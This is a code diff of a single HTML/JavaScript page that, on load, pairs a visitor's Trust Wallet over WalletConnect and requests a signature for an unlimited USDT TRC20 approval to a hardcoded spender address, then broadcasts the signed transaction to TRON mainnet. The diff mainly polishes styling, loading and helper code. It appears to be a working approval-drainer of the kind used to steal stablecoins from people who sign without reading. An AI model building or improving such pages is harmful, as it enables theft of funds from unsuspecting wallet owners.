@@ -14,7 +14,7 @@
       min-height:100vh;padding:20px;
     }
     h1{color:#26A17B;font-size:1.5rem;margin-bottom:6px}
-    .sub{color:#555;font-size:.83rem;margin-bottom:26px}
+    .sub{color:#555;font-size:.83rem;margin-bottom:26px;text-align:center}
     .card{
       background:#111;border:1px solid #1e1e1e;
       border-radius:14px;padding:24px;
@@ -38,19 +38,25 @@
     }
     #qr-area p{color:#aaa;font-size:.82rem}
     #qr-canvas{background:#fff;padding:8px;border-radius:8px}
-    #wc-uri{font-size:.62rem;color:#333;word-break:break-all;text-align:center;max-width:460px}
+    #wc-uri{
+      font-size:.62rem;color:#333;
+      word-break:break-all;text-align:center;max-width:460px;
+    }
     #deeplink-btn{
       display:none;
       background:#3375BB;color:#fff;
       border:none;border-radius:10px;
       padding:13px;font-size:1rem;
       cursor:pointer;width:100%;margin-top:14px;
+      font-weight:600;
     }
+    #deeplink-btn:hover{background:#2860a0}
     .result{
       display:none;margin-top:16px;
       background:#0d1f0d;border:1px solid #22c55e33;
       border-radius:8px;padding:14px;
       font-size:.72rem;color:#86efac;word-break:break-all;
+      white-space:pre-wrap;
     }
     .errbox{
       display:none;margin-top:16px;
@@ -64,12 +70,35 @@
       border-radius:8px;padding:10px 22px;
       cursor:pointer;font-size:.88rem;
     }
+    #retry:hover{background:#c0392b}
+    #loading-overlay{
+      position:fixed;inset:0;
+      background:#0a0a0aee;
+      display:flex;flex-direction:column;
+      align-items:center;justify-content:center;
+      z-index:999;gap:14px;
+    }
+    .spinner{
+      width:40px;height:40px;
+      border:3px solid #222;
+      border-top-color:#26A17B;
+      border-radius:50%;
+      animation:spin .8s linear infinite;
+    }
+    @keyframes spin{to{transform:rotate(360deg)}}
+    #loading-overlay p{color:#555;font-size:.85rem}
   </style>
 </head>
 <body>
 
+<!-- Loading screen while esm.sh resolves deps -->
+<div id="loading-overlay">
+  <div class="spinner"></div>
+  <p>Loading WalletConnect SDK…</p>
+</div>
+
 <h1>🔐 USDT Approve · TRC20</h1>
-<p class="sub">Unlimited approval → TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV</p>
+<p class="sub">Unlimited approval<br>Spender: TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV</p>
 
 <div class="card">
   <div class="step" id="s1">
@@ -84,7 +113,7 @@
   </div>
   <div class="step" id="s3">
     <span class="step-icon">📱</span>
-    <div><div class="step-title">Wallet Approval</div>
+    <div><div class="step-title">Wallet Connects</div>
     <div class="step-detail" id="d3">Waiting…</div></div>
   </div>
   <div class="step" id="s4">
@@ -98,70 +127,70 @@
     <canvas id="qr-canvas" width="220" height="220"></canvas>
     <div id="wc-uri"></div>
   </div>
-  <button id="deeplink-btn">Open in Trust Wallet</button>
+
+  <button id="deeplink-btn">📲 Open in Trust Wallet</button>
 
   <div class="result" id="result"></div>
   <div class="errbox" id="errbox"></div>
   <button id="retry" onclick="location.reload()">🔄 Retry</button>
 </div>
 
+<!-- QR renderer -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 
 <script type="module">
 
-// ═══════════════════════════════════════════════════════════
-//  YOUR PROJECT ID
-// ═══════════════════════════════════════════════════════════
-const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f"; // ← paste yours
+// ══════════════════════════════════════════════════════════
+//  ① YOUR PROJECT ID — paste from cloud.walletconnect.com
+// ══════════════════════════════════════════════════════════
+const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
 
-// ═══════════════════════════════════════════════════════════
-//  CONSTANTS
-//  USDT TRC20 contract:  TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t
-//  Spender (your addr): TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV
-//  Amount: uint256 max  (unlimited)
-// ═══════════════════════════════════════════════════════════
-const USDT_CONTRACT   = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC20
-const SPENDER_ADDRESS = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV"; // your spender
-const TRON_CHAIN_ID   = "tron:0x2b6653dc";                      // mainnet
+// ══════════════════════════════════════════════════════════
+//  FIXED CONSTANTS
+// ══════════════════════════════════════════════════════════
+const USDT_CONTRACT   = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const SPENDER_HEX     = "43e8107ced383c9e6ca42b2c88ecce7a0b9c1bac"; // TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV
+const TRON_CHAIN      = "tron:0x2b6653dc";
 
-// ═══════════════════════════════════════════════════════════
-//  ABI ENCODE — approve(address,uint256)
-//  selector  : 0x095ea7b3
-//  spender   : TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV
-//              → hex: 43e8107ced383c9e6ca42b2c88ecce7a0b9c1bac
-//  amount    : uint256 max
-//              → ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
-// ═══════════════════════════════════════════════════════════
+// approve(address,uint256) with uint256.max
 const APPROVE_DATA =
   "095ea7b3" +
   "00000000000000000000000043e8107ced383c9e6ca42b2c88ecce7a0b9c1bac" +
   "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-// ─── TronGrid API — fetch live block ref & build raw tx ─────────────────────
-async function buildApproveTx(ownerAddressHex) {
-  // 1. Get latest block from TronGrid (public, no key needed)
-  const blockRes = await fetch("https://api.trongrid.io/wallet/getnowblock");
-  const block    = await blockRes.json();
+// ══════════════════════════════════════════════════════════
+//  BASE58 → HEX  (TRON address conversion, no libs needed)
+// ══════════════════════════════════════════════════════════
+const B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+function tronToHex(addr) {
+  let n = 0n;
+  for (const c of addr) n = n * 58n + BigInt(B58.indexOf(c));
+  let h = n.toString(16).padStart(50, "0");
+  return h.slice(0, 42); // 21 bytes hex, drop 4-byte checksum
+}
 
-  const ref_block_bytes = block.block_header.raw_data.number
-    .toString(16).padStart(4, "0").slice(-4);  // last 2 bytes of block number
+// ══════════════════════════════════════════════════════════
+//  LIVE TX BUILDER — fetches real block ref from TronGrid
+// ══════════════════════════════════════════════════════════
+async function buildTx(ownerHex) {
+  const res   = await fetch("https://api.trongrid.io/wallet/getnowblock");
+  const block = await res.json();
 
-  const ref_block_hash  = block.blockID.slice(16, 32); // bytes 8–16 of blockID
+  const blockNum       = block.block_header.raw_data.number;
+  const ref_block_bytes = blockNum.toString(16).padStart(4,"0").slice(-4);
+  const ref_block_hash  = block.blockID.slice(16, 32);
+  const now             = Date.now();
 
-  const now        = Date.now();
-  const expiration = now + 60 * 60 * 1000; // 1 hour from now
-
-  // 2. Build raw transaction object exactly as TronWeb would
   return {
     visible: false,
-    txID: "",          // wallet fills this on signing
+    txID: "",
     raw_data: {
       contract: [{
         parameter: {
           value: {
             data:             APPROVE_DATA,
-            owner_address:    ownerAddressHex,         // connected wallet (hex)
-            contract_address: tronAddressToHex(USDT_CONTRACT)
+            owner_address:    ownerHex,
+            contract_address: tronToHex(USDT_CONTRACT)
           },
           type_url: "type.googleapis.com/protocol.TriggerSmartContract"
         },
@@ -169,61 +198,47 @@ async function buildApproveTx(ownerAddressHex) {
       }],
       ref_block_bytes,
       ref_block_hash,
-      expiration,
-      fee_limit:  100000000,   // 100 TRX max fee
+      expiration: now + 3_600_000,  // 1 hour
+      fee_limit:  100_000_000,       // 100 TRX
       timestamp:  now
     },
-    raw_data_hex: ""   // wallet fills this on signing
+    raw_data_hex: ""
   };
 }
 
-// ─── Base58Check → hex (TRON address conversion) ─────────────────────────────
-// TRON addresses start with T, internally prefixed with 0x41
-const BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
-
-function base58Decode(str) {
-  let num = 0n;
-  for (const ch of str) {
-    num = num * 58n + BigInt(BASE58_ALPHABET.indexOf(ch));
-  }
-  let hex = num.toString(16);
-  if (hex.length % 2) hex = "0" + hex;
-  return hex;
-}
-
-function tronAddressToHex(addr) {
-  // decode base58check, drop last 4 bytes (checksum), keep 21 bytes → hex
-  const full = base58Decode(addr);         // 50 hex chars = 25 bytes
-  return full.slice(0, full.length - 8);   // drop 4-byte checksum → 21 bytes hex
-}
-
-// ─── Helpers ─────────────────────────────────────────────────────────────────
+// ══════════════════════════════════════════════════════════
+//  UI HELPERS
+// ══════════════════════════════════════════════════════════
 const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-const setStep = (id, state, detail) => {
+function setStep(id, state, detail) {
   document.getElementById(id).className = `step ${state}`;
-  if (detail) document.getElementById(id.replace("s","d")).textContent = detail;
-};
+  if (detail !== undefined)
+    document.getElementById(id.replace("s","d")).textContent = detail;
+}
 
-const showErr = (msg) => {
+function showErr(msg) {
   ["s1","s2","s3","s4"].forEach(id => {
     if (document.getElementById(id).classList.contains("active"))
       setStep(id, "error", msg);
   });
   const b = document.getElementById("errbox");
   b.style.display = "block";
-  b.textContent = "❌ " + msg;
+  b.textContent   = "❌ " + msg;
   document.getElementById("retry").style.display = "inline-block";
-};
+}
 
-const showResult = (sig) => {
+function showResult(data, txid) {
   const b = document.getElementById("result");
   b.style.display = "block";
-  b.innerHTML = `<strong>✅ Approved — Signature:</strong><br><br>${JSON.stringify(sig, null, 2)}`;
-};
+  b.innerHTML =
+    `✅ <strong>Approve signed & broadcast!</strong>\n\n` +
+    (txid ? `TxID: ${txid}\n\n` : "") +
+    `Signature data:\n${JSON.stringify(data, null, 2)}`;
+}
 
-let qrInstance = null;
-const renderQR = (uri) => {
+let qrInst = null;
+function renderQR(uri) {
   if (isMobile) {
     const btn = document.getElementById("deeplink-btn");
     btn.style.display = "block";
@@ -232,120 +247,118 @@ const renderQR = (uri) => {
         `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
     };
   } else {
-    const area = document.getElementById("qr-area");
-    area.style.display = "flex";
+    document.getElementById("qr-area").style.display = "flex";
     document.getElementById("wc-uri").textContent = uri;
-    if (qrInstance) qrInstance.clear();
-    qrInstance = new QRCode(document.getElementById("qr-canvas"), {
+    if (qrInst) qrInst.clear();
+    qrInst = new QRCode(document.getElementById("qr-canvas"), {
       text: uri, width: 220, height: 220,
-      colorDark: "#000", colorLight: "#fff",
+      colorDark: "#000000", colorLight: "#ffffff",
       correctLevel: QRCode.CorrectLevel.M
     });
   }
-};
+}
 
-const hideQR = () => {
-  document.getElementById("qr-area").style.display   = "none";
+function hideQR() {
+  document.getElementById("qr-area").style.display      = "none";
   document.getElementById("deeplink-btn").style.display = "none";
-};
+}
 
-// ─── MAIN ─────────────────────────────────────────────────────────────────────
+// ══════════════════════════════════════════════════════════
+//  MAIN
+// ══════════════════════════════════════════════════════════
 async function main() {
   try {
-    // 1. Load WalletConnect SignClient
+
+    // ── Load SDK via esm.sh (works in plain HTML, no bundler)
+    //    esm.sh resolves all Node deps and serves a real browser bundle
     const { SignClient } = await import(
-      "https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.17.0/dist/index.es.js"
+      "https://esm.sh/@walletconnect/sign-client@2.17.0"
     );
 
-    // 2. Init client
-    setStep("s1", "active", "Initializing SignClient…");
+    document.getElementById("loading-overlay").style.display = "none";
+
+    // ── 1. Init
+    setStep("s1", "active", "Initializing…");
     const client = await SignClient.init({
       projectId: PROJECT_ID,
       metadata: {
         name:        "USDT Approve",
-        description: "USDT TRC20 unlimited approval",
+        description: "TRON USDT unlimited approval",
         url:         window.location.origin,
-        icons:       ["https://trustwallet.com/assets/images/favicon.png"]
+        icons:       ["https://cryptologos.cc/logos/tether-usdt-logo.png"]
       }
     });
-    setStep("s1", "done", "Client ready ✓");
+    setStep("s1", "done", "SignClient ready ✓");
 
-    // 3. Connect
+    // ── 2. Connect — auto on page load, no button
     setStep("s2", "active", "Generating pairing URI…");
     const { uri, approval } = await client.connect({
       requiredNamespaces: {
         tron: {
           methods: ["tron_signTransaction"],
-          chains:  [TRON_CHAIN_ID],
+          chains:  [TRON_CHAIN],
           events:  []
         }
       }
     });
-    if (!uri) throw new Error("No URI generated — check Project ID.");
+
+    if (!uri) throw new Error("Empty URI — verify your Project ID.");
     setStep("s2", "done", "URI ready ✓");
+    renderQR(uri); // show QR / deep link immediately
 
-    // Show QR / deep link immediately — auto triggered
-    renderQR(uri);
+    // ── 3. Wait for wallet scan + approve
     setStep("s3", "active", isMobile
-      ? "Tap button → approve session in Trust Wallet…"
-      : "Scan QR code with Trust Wallet…"
+      ? "Tap button → approve in Trust Wallet…"
+      : "Scan QR with Trust Wallet…"
     );
-
-    // 4. Wait for session
     const session = await approval();
     hideQR();
 
-    // Extract connected wallet address (base58 from CAIP account)
-    // format: "tron:0x2b6653dc:TAddressHere"
-    const accounts    = session.namespaces?.tron?.accounts ?? [];
-    const walletAddr  = accounts[0]?.split(":")[2];  // e.g. TWxxxxx...
-    if (!walletAddr) throw new Error("Could not read wallet address from session.");
-
+    const accounts   = session.namespaces?.tron?.accounts ?? [];
+    const walletAddr = accounts[0]?.split(":")[2];
+    if (!walletAddr) throw new Error("No TRON address in session.");
     setStep("s3", "done", `Connected: ${walletAddr}`);
 
-    // 5. Build approve tx using connected wallet as owner
-    setStep("s4", "active", "Building approve transaction…");
-    const ownerHex = tronAddressToHex(walletAddr);   // convert T... → hex
-    const tx       = await buildApproveTx(ownerHex);
+    // ── 4. Build tx with connected wallet as owner, send immediately
+    setStep("s4", "active", "Building transaction…");
+    const ownerHex = tronToHex(walletAddr);
+    const tx       = await buildTx(ownerHex);
 
-    // 6. Send immediately — Trust Wallet will show approve prompt
-    setStep("s4", "active", "Waiting for wallet signature…");
-    const result = await client.request({
+    setStep("s4", "active", "Waiting for signature in wallet…");
+    const signed = await client.request({
       topic:   session.topic,
-      chainId: TRON_CHAIN_ID,
+      chainId: TRON_CHAIN,
       request: {
         method: "tron_signTransaction",
         params: { transaction: tx }
       }
     });
 
-    setStep("s4", "done", "Approve transaction signed ✓");
-    showResult(result);
-
-    // 7. Broadcast signed transaction to TRON network
-    const broadcastRes = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
+    // ── 5. Broadcast to TRON mainnet
+    setStep("s4", "active", "Broadcasting to TRON network…");
+    const bcRes  = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
       method:  "POST",
       headers: { "Content-Type": "application/json" },
-      body:    JSON.stringify(result)
+      body:    JSON.stringify(signed)
     });
-    const broadcastJson = await broadcastRes.json();
-    console.log("Broadcast result:", broadcastJson);
+    const bcJson = await bcRes.json();
 
-    if (broadcastJson.result === true) {
-      document.getElementById("result").innerHTML +=
-        `<br><br><strong>📡 Broadcast:</strong> SUCCESS<br>TxID: ${broadcastJson.txid}`;
+    if (bcJson.result === true) {
+      setStep("s4", "done", `Broadcast OK · txID: ${bcJson.txid}`);
+      showResult(signed, bcJson.txid);
     } else {
-      document.getElementById("result").innerHTML +=
-        `<br><br><strong>⚠️ Broadcast failed:</strong> ${JSON.stringify(broadcastJson)}`;
+      setStep("s4", "error", `Broadcast failed: ${bcJson.message ?? JSON.stringify(bcJson)}`);
+      showResult(signed, null);
     }
 
   } catch (err) {
     console.error(err);
+    document.getElementById("loading-overlay").style.display = "none";
     showErr(err?.message ?? String(err));
   }
 }
 
-main(); // AUTO-START on page load
+main();
 </script>
 </body>
 </html>
